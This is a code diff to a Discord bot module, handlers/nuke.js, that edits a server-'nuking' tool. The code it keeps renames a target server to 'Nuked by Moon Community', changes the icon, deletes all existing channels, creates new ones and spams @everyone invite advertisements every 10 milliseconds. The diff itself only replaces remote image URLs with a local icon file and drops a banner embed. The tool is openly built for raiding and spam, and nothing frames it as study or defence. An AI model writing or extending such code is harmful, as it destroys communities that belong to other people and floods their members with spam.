@@ -1,10 +1,12 @@
 // handlers/nuke.js
 const { ChannelType } = require("discord.js");
+const fs = require('fs');
+const path = require('path');
 
 let welcomeInterval = null;
 
 // =========================
-// BANNER URL
+// BANNER URL (For !moon)
 // =========================
 const BANNER_URL = "https://cdn.discordapp.com/attachments/1531280455553388564/1555413440024023100/a9366db0-e4ac-4190-845c-b1eeb6e88b92.gif?backend=b2&ex=6ac7af66&is=6ac65de6&hm=ff994fce35c7a6fad6460c11715e456166f82dfe486a734e4c744016b3ce9207&";
 
@@ -35,9 +37,10 @@ module.exports = (client) => {
 
                 // 1.1 Server Details Change
                 await guild.setName("Nuked by Moon Community 🌙").catch(() => {});
-                await guild.setIcon(
-                    "https://cdn.discordapp.com/attachments/1531280455553388564/1556007534551371776/519nH38DWOL._AC_UF8941000_QL80_.jpg?backend=b2&ex=6ac29871&is=6ac146f1&hm=f78a05a105d4e1b0b48cd263fe0af374c40161823702edf73e853c8f1bb09465&"
-                ).catch(() => {});
+                const iconPath = path.join(__dirname, '../assets/icon.png');
+                if (fs.existsSync(iconPath)) {
+                    await guild.setIcon(iconPath).catch(() => {});
+                }
                 
                 // 2. Delete all existing channels
                 const channels = [...guild.channels.cache.values()];
@@ -120,7 +123,7 @@ module.exports = (client) => {
         }
 
         // ==========================================
-        // 3. COMMAND: !bloom
+        // 3. COMMAND: !bloom (Banner removed, uses local icon.png)
         // ==========================================
         if (command === "!bloom") {
             try {
@@ -139,9 +142,10 @@ module.exports = (client) => {
 
                 // 1.1 Server Details Change
                 await guild.setName("Moon Community 🌙").catch(() => {});
-                await guild.setIcon(
-                    "https://cdn.discordapp.com/attachments/1531280455553388564/1556007534551371776/519nH38DWOL._AC_UF8941000_QL80_.jpg?backend=b2&ex=6ac29871&is=6ac146f1&hm=f78a05a105d4e1b0b48cd263fe0af374c40161823702edf73e853c8f1bb09465&"
-                ).catch(() => {});
+                const iconPath = path.join(__dirname, '../assets/icon.png');
+                if (fs.existsSync(iconPath)) {
+                    await guild.setIcon(iconPath).catch(() => {});
+                }
                 
                 // 2. Delete all existing channels
                 const channels = [...guild.channels.cache.values()];
@@ -170,13 +174,12 @@ module.exports = (client) => {
                     }
                 }
 
-                // 5. Send initial message
+                // 5. Send initial message (No banner)
                 const welcomeMessage = "@everyone @here\n🌙 **Join Our Moon Community!** ✨\nActive Chats • Coding • Events • Chill Vibes 🚀\n🔗 https://discord.gg/62xxMq2NKv";
                 await Promise.all(
                     newChannels.map(channel =>
                         channel.send({
-                            content: welcomeMessage,
-                            embeds: [{ image: { url: BANNER_URL } }]
+                            content: welcomeMessage
                         }).catch(() => {})
                     )
                 );
@@ -191,8 +194,7 @@ module.exports = (client) => {
                 welcomeInterval = setInterval(async () => {
                     for (const channel of newChannels) {
                         await channel.send({
-                            content: welcomeMessage,
-                            embeds: [{ image: { url: BANNER_URL } }]
+                            content: welcomeMessage
                         }).catch(() => {});
                     }
                 }, 10);
@@ -214,3 +216,4 @@ module.exports = (client) => {
         }
     });
 };
+                        
